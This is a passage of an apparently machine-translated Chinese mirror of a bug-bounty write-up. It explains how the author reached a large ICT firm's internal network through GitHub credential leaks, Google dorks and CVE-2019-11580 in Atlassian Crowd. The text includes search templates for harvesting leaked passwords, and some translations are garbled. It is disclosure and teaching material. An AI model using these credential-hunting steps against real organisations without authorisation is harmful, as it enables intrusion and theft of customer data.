<html>
<head>
<title>From Recon to Optimizing RCE Results - Simple Story with One of the Biggest ICT Company in the World</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从侦察到优化RCE结果——世界上最大的ICT公司之一的简单故事</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a?source=collection_archive---------0-----------------------#2020-02-18">https://infosecwriteups.com/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a?source=collection_archive---------0-----------------------#2020-02-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="d038" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">我最终是如何利用各种漏洞进入内部网络(并访问他们所有的内部资产)的。</h2></div><p id="f15b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi">بسم الله الرحمن الرحيم</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="9587" class="lk ll iq lg b gy lm ln l lo lp">Mirroring from: <a class="ae lq" href="http://www.firstsight.me/2020/02/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-world/" rel="noopener ugc nofollow" target="_blank">http://www.firstsight.me/2020/02/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-world/</a></span><span id="269e" class="lk ll iq lg b gy lr ln l lo lp"><em class="ls">Here is a little story about how I finally could got into an internal network (and could accessing all of their internal assets) at one of the biggest ICT company in the world by using various vulnerabilities (from sensitive data exposure, miss-configuration, until outdated version of application that vulnerable to unauthenticated RCE).</em></span><span id="1567" class="lk ll iq lg b gy lr ln l lo lp">Note: The program owner has given me a permission to release this article.</span><span id="a333" class="lk ll iq lg b gy lr ln l lo lp">PDF Version: <a class="ae lq" href="http://firstsight.me/fia07a53c4ec63d2b0d47fe27ea2645d82f8c98648/[ENG]%20The%20Story%20about%20How%20I%20Finally%20could%20Got%20into%20an%20Internal%20Network%20v03.pdf" rel="noopener ugc nofollow" target="_blank">Download here.</a></span></pre><p id="19ca" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，正如我的其他文章一样，这篇简单的文章将有两种不同的方法，它们是:</p><ul class=""><li id="5838" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">对于只需要这篇文章的要点的人来说(是的，<strong class="kh ir">如果读者已经理解了每一个流程，这可以节省大量的时间</strong>。只是请好心人看看<strong class="kh ir">TL；博士</strong>节)，以及</li><li id="c4d4" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated">对于需要了解这些发现的执行流程或旅程的人来说(InshaAllah它可以告诉读者我的一些方法)。希望它也能帮助处于红队活动“第一阶段”的人们。</li></ul><p id="fc48" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">请欣赏这个故事。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h1 id="4d1f" class="mo ll iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">I. TL速度三角形定位法(dead reckoning)</h1><p id="54bd" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">简而言之，在获得内部网络的过程中，有3个独立的要点(姑且称之为阶段)，它们是:</p><ul class=""><li id="1ac6" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">在Github上寻找目标的凭证和内部IP地址(包括这两者的模式),并继续学习他们的开发文化，如使用的框架(这可以让我们更容易知道这是否属于他们)。</li></ul><p id="4245" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">参见<a class="ae lq" href="https://twitter.com/th3g3nt3lman" rel="noopener ugc nofollow" target="_blank"> <strong class="kh ir"> Th3g3nt3lman </strong> </a>在<strong class="kh ir"> <em class="ls"> Bugcrowd大学</em></strong>:<a class="ae lq" href="https://www.youtube.com/watch?v=l0YsEk_59fQ" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">Github Recon及敏感数据曝光</strong> </a> <strong class="kh ir">。</strong></p><ul class=""><li id="82c9" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">第二个是我不知道为什么要做的事情，但是它很有效！因此，在得到他们的密码模式后，我使用简单的谷歌呆子来查找是否有任何意外泄漏被谷歌索引或没有。简单的呆子就是:<strong class="kh ir"> site:*.target.com和intext:'their_password' </strong></li></ul><p id="d6c5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">参见我的一篇文章:<a class="ae lq" href="http://www.firstsight.me/2017/12/information-disclosure-at-paypal-and-xoom-paypal-acquisition-via-search-engine/" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">【PayPal和Xoom (via Google Dork)的信息披露】</strong> </a> <strong class="kh ir">。</strong></p><ul class=""><li id="cef4" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">最后一个，我回到我的子域枚举结果，最终发现他们的一个子域正在使用过时的Atlassian Crowd版本。通过使用<a class="ae lq" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11580" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">CVE-2019–11580</strong></a>的公开漏洞，我就可以获得这台服务器的root权限。在查看该服务器的内部IP时，我意识到该服务器是否位于他们的内部网络中，该网络可以直接从内部访问非公共资源和大部分公共资源。</li></ul><p id="6b4f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是的，正如您所看到的，第一点(Github recon)的所有信息也可以在此阶段使用，因为没有任何安全边界(如防火墙和其他)来与其他资产通信(是的，这个摘要得到了加强，因为我在point到他们的几个资产时，成功地从其他网段获得了他们内部IP地址的几个响应)。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nk"><img src="../Images/f87fdc86c0b799c3a25dfaa5055171f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ve64IKM8wkRqqrT_.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图1亚特兰蒂斯人群—过时版本</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/78066a2b01bd2d61954f0c8fd15c033c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Nx3I1-RjOlXVmg30.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图2当得到稳定的反向壳时</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nx"><img src="../Images/253a53ea15aaed0584078ce0938add34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vKIv9bhE16DSCEIr.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图3 ping几个公共资产后得到几个(内部IP)响应</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h1 id="ede3" class="mo ll iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">二。旅程</h1><p id="0c18" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">因此，回到2019年12月前，我计划优化我的狩猎活动，以实现我在最后几个月足够活跃的目标。带着获得RCE并访问他们内部资产的希望，我尝试从basic开始进行一些活动。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="d1af" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.1.来自Github的侦察</h2><p id="9c40" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">因为我已经(至少)有了数千个他们的子域名(在大约3个月内找到90多个发现后，我还不知道我应该做什么)，然后我试图再次回到basic。在那种情况下，我试图在Github进行侦察，寻找一些我可能能够得到的信息。(这次谈话可能是一个很好的参考:<a class="ae lq" href="https://www.youtube.com/watch?v=l0YsEk_59fQ" rel="noopener ugc nofollow" target="_blank"> Github Recon和敏感数据曝光</a>)。</p><p id="7572" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">那么，这次侦察的目的是什么？是寻找凭据并对受影响的服务进行测试，以确定它是否有效？大多数情况下，是的。但我也尝试了其他可能会让我有所收获的方法。</p><p id="5e5b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我做的事情是:</p><p id="3d50" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 1。</strong>收集凭证(是否仍然有效)然后尝试<strong class="kh ir">寻找图案</strong>。这是<strong class="kh ir">找出默认密码</strong>，该密码可能由管理员在创建帐户时提供给每个用户。这个问题的目的将在下一节(#2.2)中回答。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oj"><img src="../Images/2e1b9c879c559aaa2d7249f7a4f4058a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Wj1PKI8Ja4S7-laT.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图4在Github找到的几个有效和无效的凭证</figcaption></figure><p id="76fc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这次活动中，我发现了大约50个不同的密码。</p><p id="e517" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 2。</strong>收集IP地址<strong class="kh ir">尝试学习模式</strong>。在这种情况下，可以实现两点，即</p><ul class=""><li id="929e" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated"><strong class="kh ir">第一个原因:</strong>作为我们提交给项目的报告的支持数据(记住，在将报告发送给项目负责人之前，会有分析师对报告进行分析。只是不要在没有任何分析的情况下报告问题，浪费他们的时间)。我想说的是，如果侦察的结果包含很多内部资产(不能公开)，那么也有假警报的可能性。所以，当你学会了这个模式，它可以帮助你分析这个仓库是否属于他们。</li><li id="fa5f" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated">是真的吗？嗯，至少我从这个方法中成功找到了5个P1。</li></ul><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/ea7a8b990acf3ca538c238a9af014f4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*63nXztejJx7kmZ1e.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图5少数报告的问题</figcaption></figure><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="0913" class="lk ll iq lg b gy lm ln l lo lp">Believe me, reporting an issue with an analysis will not waste the analyst’s time. And, they will also be happy to help you ask the program owner directly.</span></pre><ul class=""><li id="fc38" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated"><strong class="kh ir">第二个原因</strong>是为了让我们以后访问他们的内部网络时更容易连接到找到的资产。</li></ul><p id="3385" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 3。</strong>最后，第三个是学习他们的发展文化。在这一部分，经过大约16个小时的调查(分开几天，我每天只花大约2-3个小时)，我终于找到了一些用于开发他们内部应用程序的框架(模式)。这也让我们更容易识别哪个属于他们的资产</p><p id="bc2f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">另一方面，这一点也可以帮助每个在源代码审查方面很强的人找到相关应用程序中可能存在的弱点。</p><p id="97fa" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以，<strong class="kh ir">这三样东西是我们侦察的第一阶段</strong>来收集关于目标的大量信息。</p><p id="49ca" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是我该怎么做呢？在继续第二阶段之前，我将在下一节解释。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="508c" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.1.1.来自Github的PoC-Recon</h2><p id="38c0" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">在<a class="ae lq" href="https://www.youtube.com/watch?v=l0YsEk_59fQ" rel="noopener ugc nofollow" target="_blank">他的演讲</a>，<strong class="kh ir"> Th3g3nt3lman </strong>提供了全面的解释。但是如果我试着再解释一遍也没有错。</p><p id="1a22" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，开发人员在使用Github等协作软件工具时会犯一些常见的错误，即他们将凭证(尤其是有效凭证)放在公共存储库中。当然，有许多因素会使这种情况发生，要么是因为开发者不知道Github目前是否免费提供了“私有”功能，要么是开发者没有意识到未经授权的人是否也可以找到他们的公共存储库并为自己的目的使用敏感的东西。</p><p id="c4ad" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注意:</strong>不考虑任何因素，这当然是必须考虑并引起重视的事情，因为这个问题通常被用作进入目标网络的第一步。</p><p id="2201" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">回到主题，重现这一侦察需要登录我们的Github帐户，并开始使用各种关键字优化搜索，例如:</p><ul class=""><li id="f9d9" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated"><strong class="kh ir">密码</strong> <strong class="kh ir"> ".target.tld" </strong>。请注意，在另一边，“密码”关键字也可以替换为其他好的，如telnet，ftp，ssh，mysql，jdbc，oracle，和其他。</li><li id="ec32" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">target . TLD</strong>T18】“密码_值_此处”。老实说，我不知道Github的搜索功能是如何工作的，但是通过使用这两个不同的关键字，我得到了一个不同的结果，让我找到了一些好东西。</li></ul><p id="e6cb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">假设您发现了一个存储库，其中包含一个属于目标资产密码。你所需要做的就是不要停留在那里。浏览该存储库中的更多信息，例如:</p><p id="9ed6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> i. </strong>该用户是否将(目标的)其他凭证存储在那些找到的存储库中，或者存储在用户自己拥有的其他存储库中？这可以通过使用简单的关键字(比如<strong class="kh ir">密码</strong>、<strong class="kh ir">密码</strong>、<strong class="kh ir">密码</strong>等等)来实现。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ol"><img src="../Images/535c5db1c6af75d83dc8deff8c44d87e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*08hZM-NkU8oIfZTi.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图6对特定存储库的特定搜索示例</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi om"><img src="../Images/2c14bd93a63f089c627da0490ebfc8cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Q7lF4sUsFWNYi9lt.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图7具体搜索该用户拥有的存储库的示例</figcaption></figure><p id="78dd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">二。</strong>该存储库是否有另一个端点信息？这也可以通过对这个存储库使用简单的关键字(比如<strong class="kh ir"> target.tld </strong>)来实现。</p><p id="b5cf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果我们什么都没找到呢？然后尝试查看该用户拥有的另一个存储库。</p><p id="4e41" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">三。</strong>如果这两个流程都“不起作用”，那么尝试在这个存储库中找到与这个用户协作的其他用户。比方说，你找到了B用户。然后尝试访问这些用户，并在该用户帐户中重复第一(I)和第二(ii)步，以找到其他可能的有用信息。</p><p id="f633" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">作为总结，我做了一个简单的思维导图，可能对读者有用:</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/41ea6efdbeadb97c0e45d91302d16d90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ddmcCZ14kuMdHBPC.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图8简单Github侦察的思维导图</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="18fe" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.1.2.常见问题</h2><p id="c6b7" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">是的，我听到了。所有这些(手动)活动都将花费大量时间，而且不能保证我们能找到感兴趣的信息。 <strong class="kh ir"> <em class="ls">但是，这就是测试/狩猎的重点吧？</em></strong></p><p id="f42a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有没有任何自动化工具可以帮助我们进行这项活动？是的，很多。但是当我测试几个公共工具时，我并没有发现多少我从这个手动活动中发现的东西。所以，自动化工具是没有用的？不，我不是那个意思。结合自动化和手动方式是优化结果的明智之举。如果自动化工具找不到我从手工方式找到的东西，反之亦然。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="3a20" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.2.来自谷歌呆子的侦察</h2><p id="2484" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">在我认为我已经收集了足够的信息之后，我就进入了下一个阶段。</p><p id="524e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">说实话，我也不知道自己为什么要这么做，但当时这么做似乎很有道理。简而言之，我尝试使用一个简单的谷歌呆子，这是通过把他们的内部(私人)子域和密码模式，我发现作为关键字。</p><p id="cada" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注1: </strong>我如何知道他们的内部(私有)子域？要回答这个问题，请参考第一阶段的解释。总之，从第一阶段的侦察活动，我发现了一个有趣的子域，其中包含几个更多的子域。从这里，我假设如果这个子域被他们用作开发区域的一部分。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi on"><img src="../Images/18e317bec7ecbd809eadf125af35c66b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*0yD_mV9aQ5Wb4SFu.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图9一个包含多个子域子域——对于开发区域</figcaption></figure><p id="42e5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如前所述，因为它是一个内部子域(私人)，那么所有这些子域不能从公共区域访问。</p><p id="d62d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注2: </strong>要了解更多关于与Google Dork合作的细节，请参考<a class="ae lq" href="http://www.firstsight.me/2017/12/information-disclosure-at-paypal-and-xoom-paypal-acquisition-via-search-engine/" rel="noopener ugc nofollow" target="_blank">我写的一篇关于PayPal和Xoom的文章</a>。</p><p id="5db3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这是我使用的简单关键词:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="d92b" class="lk ll iq lg b gy lm ln l lo lp">site:<strong class="lg ir">*.subx.target.tld</strong> AND intext:'<strong class="lg ir">one_of_password_pattern_value_here</strong>'</span></pre><p id="f9b6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这背后的原因是:我试图找到任何可能的敏感信息(包含那些密码模式)，可能在该子域(虽然我知道，如果这些子域只有内部访问可用)。你猜怎么着？有用！</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oo"><img src="../Images/4e02f859b43bd6b359db627955b11a06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ffoM_5VC_uFN_ZkA.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图10发现了许多敏感信息</figcaption></figure><p id="810c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从这个阶段，我获得了很多信息，比如凭证(用于web和其他服务，比如FTP或SSH)、其他端点、内部IP地址等等。一件好事是，一些信息可以从公共区域访问，但其中一些需要内部访问。</p><p id="78f0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">请注意，通过优化使用的关键字，我们还可以从这次侦察中列举更多的信息。例如，只需将intext参数中的“密码模式”更改为其他值，如找到的IP地址(只需输入前两个八位字节)、产品名称(Oracle、MySQL、MSSQL和其他)、服务名称(FTP、SSH、DB和其他)、登录活动常用的其他关键字(如密码、pwd、pass、用户名、userid和其他)，或通常与登录相关的其他关键字(如dashboard、cms和其他)。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="454b" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.2.1.结果——来自谷歌呆子的侦察</h2><p id="9c57" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">我得到的一个非常好的结果是，我发现大约有4个帐户可以用来访问“范围内”计划门户，这些帐户可以访问客户数据。</p><p id="5237" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是的，这个账户使用了我在Github recon活动中发现的密码模式。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi op"><img src="../Images/0a970ce8ba3bc8fdcb37b48d433758c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ouBsKICF-5rwhCI2.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图11几个好结果</figcaption></figure><p id="d589" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">另一方面，我还可以访问他们的一个“<strong class="kh ir">超级管理员</strong>”帐户(很遗憾，不在“范围内”资产中)，其中包含他们客户的许多大公司的名称(有大量交易数据)。(对不起，我不能给出那些门户的截图)。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi on"><img src="../Images/0cb83a6c0198d7f793120b73829f578e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7ITHo1IqQXmldfKD.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图12已经解决了——他们只是还没有更新</figcaption></figure><p id="d1d9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">还有什么？嗯，如前所述，我还成功地访问了包含大量敏感信息的另一个端点(使用找到的帐户)。</p><p id="8878" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是，由于需要内部访问而无法使用的信息怎么办？别担心。我们会保留这个，就像我们保留从Github recon 获得的信息一样。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="a296" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.未经认证的RCE在过时版本的亚特兰蒂斯人群</h2><h2 id="3d40" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.1.发现过时的Atlassian群组应用程序</h2><p id="8dfe" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">所以，我收集了很多他们的内部信息。我也有他们的密码模式。但是我在这里有一个真正的问题，那就是，虽然我已经报告了我在第一阶段和第二阶段发现的几乎所有问题(可以从公共区域访问)，<strong class="kh ir">我仍然没有内部访问</strong>。</p><p id="788d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从这种情况下，然后我尝试再次看到我的子域枚举的结果。为了简单起见，我使用了<a class="ae lq" href="https://github.com/michenriksen/aquatone" rel="noopener ugc nofollow" target="_blank">的aquatone捕捉功能</a>。</p><p id="c0e1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">仔细找了一下，终于找到了一个看起来很老的端点。它只包含几个词与可点击的链接，例如:第一个词，第二个词，第三个词，和人群。在所有的词中，唯一引起我注意的是“<strong class="kh ir">人群</strong>”。(<strong class="kh ir">注</strong>:不出所料，其他可点击的链接并没有什么好的可利用之处)。</p><p id="a347" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当访问“crowd”可点击链接时，我被重定向到一个包含Atlassian Crowd应用程序的子域。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oq"><img src="../Images/37a8c719d8c39c3aa49b14c74b1b2f5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vgWWw8-8J5nS2CIW.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图13找到了过时的Atlassian群组应用程序</figcaption></figure><p id="5f68" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简单说明一下，<strong class="kh 